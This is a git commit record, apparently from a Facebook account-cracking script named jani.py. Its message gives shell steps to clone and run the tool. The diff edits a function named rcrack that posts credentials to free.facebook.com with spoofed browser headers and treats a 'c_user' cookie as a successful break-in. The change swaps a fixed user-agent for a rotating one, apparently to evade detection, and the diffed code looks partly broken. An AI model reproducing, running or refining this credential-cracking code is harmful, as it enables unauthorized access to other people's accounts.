ed34b1af57ed7ca1fe620110aa63073f96829b81
Jhalla11 <116496651+Jhalla11@users.noreply.github.com>
2023-01-31 02:50:31 +0500

    Update jani.py
    rm -rf jani
    git clone https://github.com/Jhalla11/jani.git
    ls
    cd jani
    ls
    python jani.py

--- jani.py
+++ jani.py
@@ -244,9 +244,7 @@ def rcrack(uid,pwx,tl):
     'sec-fetch-site': 'none',
     'sec-fetch-user': '?1',
     'upgrade-insecure-requests': '1',
-    'user-agent': 'Mozilla/5.0 (Mobile; rv:48.0; A405DL) Gecko/48.0 Firefox/48.0 KAIOS/2.5',
-}
-            'user-agent': pro}
+    'user-agent': pro}
             lo = session.post('https://free.facebook.com/', cookies=cookies, headers=headers).text
             log_cookies=session.cookies.get_dict().keys()
             if 'c_user' in log_cookies:
